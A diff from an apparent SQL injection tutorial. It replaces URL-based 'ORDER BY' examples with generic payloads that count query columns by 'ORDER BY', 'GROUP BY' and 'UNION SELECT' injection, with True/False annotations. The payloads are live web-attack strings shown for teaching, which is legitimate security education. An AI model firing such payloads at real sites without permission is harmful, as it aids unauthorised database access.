@@ -41,10 +41,23 @@ You can find the number of columns with order by:
 
 We will send this request if we don't get a response, that means the number of columns is less than 10 Now we decrease one by one until we get the response on page 13 and find the number of columns.
 
-    ?id=13'order by 9 %23 => 500
-    ?id=13'order by 8 %23 => 500
-    ?id=13'order by 7 %23 => 500 
-    ?id=13'order by 6 %23 => 200 , the number of column=6
+    1' ORDER BY 1--+    #True
+    1' ORDER BY 2--+    #True
+    1' ORDER BY 3--+    #True
+    1' ORDER BY 4--+    #False - Query is only using 3 columns
+                            #-1' UNION SELECT 1,2,3--+    True
+
+and GROUP BY:
+
+    1' GROUP BY 1--+    #True
+    1' GROUP BY 2--+    #True
+    1' GROUP BY 3--+    #True
+    1' GROUP BY 4--+    #False - Query is only using 3 columns
+                            #-1' UNION SELECT 1,2,3--+    True
+
+                            
+
+
 
 UNION is used to agree two queries. You can find the number of columns using UNION
 
